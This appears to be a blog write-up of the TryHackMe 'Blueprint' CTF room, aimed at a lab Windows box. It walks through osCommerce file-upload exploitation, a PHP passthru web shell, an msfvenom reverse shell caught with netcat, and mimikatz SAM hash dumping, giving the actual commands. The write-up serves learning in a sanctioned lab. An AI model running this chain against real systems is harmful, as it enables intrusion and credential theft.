---
weight: 3
title: "CTF writeup - Blueprint"
date: 2021-03-20T21:57:40+08:00
lastmod: 2021-03-21T16:45:40+08:00
description: "This is my second TryHackMe writeup"

title: CTF writeup - Blueprint
featuredImage: tryhackmebanner.jpg
hiddenfeaturedImage: true

tags: ["TryHackMe", "CTF"]
categories: ["Writeups"]

lightgallery: false
summary: Joining the __"Blueprint"__ room on the TryHackMe platform, it tells us that this box is apparently a windows machine that hosts a vulnerable website. We will hack into this Windows machine and escalate our privileges to Administrator by NOT using Metasploit.
---

# {{< figure src="/blueprint/banner.jpg" title="Hack into this Windows machine and escalate your privileges to Administrator." >}}

## Summary

1. Recon with nmap & Enumerate the services. SMB on port 139 and 445, HTTP-Proxy on port 8080 and HTTPS on port 443.
2. The HTTP service on port 8080 has directory listing and hosts an e-commerce app. 
3. Initial foothold by exploiting a known misconfiguration in the oscommerce application which lets us create an authenticated user.
4. With the authenticated user we exploit a known vulnerability in the app which gives us Arbitrary File Upload.
5. Upload a PHP script which gives us Remote Code Execution through PHP passthru.
6. Create and upload a payload with a reverse Windows TCP/IP shell.
7. We catch the shell, enumerating further and upload mimikatz to the target machine.
8. Dump the hashes, crack the hashes.
9. Read root.txt and get our last flag to complete the room.

## Recon & Scanning

We start with our usual nmap scan:

nmap -sV -sC -A -T4 -p- 10.10.13.10

{{< figure src="/blueprint/nmap.jpg" title="" >}}

We immidietaly discover some ports that quickly tells us this is a Windows machine with some services worth investigating.

1. Port 80 - Reveals a webserver which leads us to a default “page not found” webpage.
2. Port 445 - Which is SMB running on top of TCP
3. Port 3306 - Which is the default port for the classic MySQL service
4. Port 139 - Which is the old SMB that runs on top of NetBIOS.
5. Port 443 - The standard port for Secure HTTP. This leads us to a directory listing.
6. Port 8080 - Apache Webserver with OpenSSL and PHP

## Enumeration

So, our first step will be to look at the SMB shares using enum4linux and smbclient.
(Nothing interesting to reveal here, so we move on..)

Let's go ahead and visit the web service on port 443:

{{< figure src="/blueprint/directorylisting.jpg" title="" >}}

Interesting...a directory listing with some sort of e-commerce app. We can also see that the server is running Apache with OpenSSL and PHP, with even the version info disclosed.

We can enumerate further and try directory brute forcing with dirsearch:

```bash
python3 dirsearch.py -u http://10.10.13.10:8080/oscommerce-2.3.4/ -e php,cgi,html,txt,exe -x 400,401,403 -r -R 3 -t 100
```

{{< figure src="/blueprint/dirsearch1.jpg" title="" >}}

Results! We found some interesting paths; ADMIN and INSTALL.

{{< figure src="/blueprint/dirsearch_result.jpg" title="" >}}

Browsing to the INSTALL page, we find this strange site Welcome to osCommerce Online Merchant v2.3.4!
It wants us to start an installation...

{{< figure src="/blueprint/oscommerce_install.jpg" title="" >}}

So without tampering anymore with the installation page, we have to find out some more info on this and see if theres a possible exploit.
A quick “searchsploit” in Kali terminal tells us that this might have a vulnerability.

{{< figure src="/blueprint/searchsploit.jpg" title="" >}}

The ones that stand out to me are “Arbitrary File Upload” and “Remote Code Execution”. This can perhaps get us a shell and initial access.
Let's check it out!

Copying the python script to our working directory:
{{< figure src="/blueprint/pythonscript1.jpg" title="" >}}

After looking through the python script for the “Arbitrary File Upload”, I can see that theres a method for an AUTHENTICATED user to exploit this succesfully . We should probably go back to the installation page and create an authenticated user before going further...
{{< figure src="/blueprint/pythonscript2.jpg" title="" >}}

## Exploitation

#### Back to the /install/ page we create a new user: 

{{< figure src="/blueprint/oscommerce_install2.jpg" title="" >}}

After the process is done, we see this page:

{{< figure src="/blueprint/oscommerce_install3.jpg" title="" >}}

We now have completed the process and created an authenticated user. We can try to upload something now with the Arbitrary File Upload exploit.
We could try a simple php script that works with native PHP:

{{< figure src="/blueprint/php_passthru.jpg" title="" >}}

Explanation from PHP.net:

>    exec() is for calling a system command, and perhaps dealing with the output yourself.
>    system() is for executing a system command and immediately displaying the output - presumably text.
>    passthru() is for executing a system command which you wish the raw return from - presumably something binary.

So basically this will let us do RCE through our browser adress bar. Pretty cool!

{{< figure src="/blueprint/shell.jpg" title="" >}}

```bash
python 43191.py -u http://10.10.248.2:8080/oscommerce-2.3.4/ --auth=admin:admin -f shell.php
```

The command is successful. Lets try to browse to the provided link and execute commands!

{{< figure src="/blueprint/browser_rce.jpg" title="" >}}
<!--/shell.php?cmd=whoami-->

So we now have managed to upload a file AND we can also perform Remote Code Execution on the system. Because we are a system user, we also have the HIGHEST privileges on the local system. Awesome! =)

From Microsoft.com:
*“The account NT AUTHORITY\System which is a Local System account.. It is a powerful account that has unrestricted access to all local system resources. It is a member of the Windows Administrators group on the local computer, and is therefore a member of the SQL Server sysadmin fixed server role.”*

This immediately gives me an idea; Lets create an msfvenom payload for Windows with a reverse shell and upload it just like we did with the shell.php file.

{{< figure src="/blueprint/msfvenom.jpg" title="" >}}

So you can see here that all it took was 2 simple commands with the right parameters.
All we need to do next is to catch the reverse shell connection with a netcat listener.

We start our listener to prepare for our newly uploaded shell:

```bash
nc -lvnp 9999
```

And then browse to http://10.10.248.2:8080/oscommerce-2.3.4/catalog/admin/shell.php?cmd=shell

{{< figure src="/blueprint/netcat.jpg" title="" >}}

We have a windows CMD shell! 
Our tasks wants us to get the hash of the first user.

This makes me think of Mimikatz, a tool that is used to grab hashes.
Now that we can upload files, lets upload Mimikatz. We also need to know which architecture of windows that is running with a simple “systeminfo”

{{< figure src="/blueprint/systeminfo.jpg" title="" >}}
<!--systeminfo shows x86-based PC architecture-->

Copying the mimikatz binary to our working directory and preparing for upload:
{{< figure src="/blueprint/copy_katz.jpg" title="" >}}

```bash
locate mimikatz_x86.exe
cp /usr/share/responder/tools/MultiRelay/bin/mimikatz_x86.exe .
ls
```

AND we upload it just as we did before!
{{< figure src="/blueprint/upload_katz.jpg" title="" >}}

We run "dir" back in the netcat session shell, and there it is! Mimikatz.exe.
{{< figure src="/blueprint/dir.jpg" title="" >}}

## Dumping and cracking hashes

NOW, its time to grab some hashes back in our pseudo-terminal!


{{< figure src="/blueprint/hashdump.jpg" title="mimikatz_x86.exe; lsadump::sam" >}}

We can proceed to crack the users NTLM hashes with JohnTheRipper or Hashcat, but lets try the easy and faster method first;
Hello crackstation!

{{< figure src="/blueprint/crackstation.jpg" title="" >}}

The final task is to find the root.txt flag. We can do a quick search for this and use the MORE command to display the contents of the .txt file.

{{< figure src="/blueprint/filesearch.jpg" title="" >}}

```powershell
cd/
where /r c:\ root*
more c:\Users\Administrator\Desktop\root.txt.txt
```
And we found the last flag!

##  Final Thoughts

Blueprint was a great learning opportunity for me. I could have made it much faster with just using Metasploit and a meterpreter session, but instead I chose to do it manually using the upload and RCE exploit and Mimikatz.



